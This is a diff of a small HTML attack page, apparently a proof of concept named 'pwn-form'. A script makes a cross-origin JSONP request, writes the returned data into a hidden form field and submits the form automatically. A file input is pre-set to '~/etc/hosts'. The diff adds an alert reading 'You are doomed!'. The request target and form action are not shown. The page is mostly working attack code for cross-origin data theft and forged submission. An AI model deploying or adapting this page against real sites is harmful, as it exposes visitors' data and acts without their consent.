@@ -11,10 +11,7 @@
     <input type="hidden" id="name" name='n' value='Some Value'/>
 
     <input type="file" name="myFile" id="myFile" value="~/etc/hosts">
-
-
 </form>
-</body>
 <script src="https://code.jquery.com/jquery-3.3.1.js"
         integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossOrigin="anonymous"></script>
 
@@ -30,6 +27,7 @@
         },
         dataType: 'jsonp',
         success: function (data) {
+            window.alert("You are doomed!");
             document.getElementById('name').value = JSON.stringify(data);
         },
         type: 'GET'
@@ -38,5 +36,4 @@
     var form = document.getElementById("pwn-form");
     form.submit();
 </script>
-
 </body>
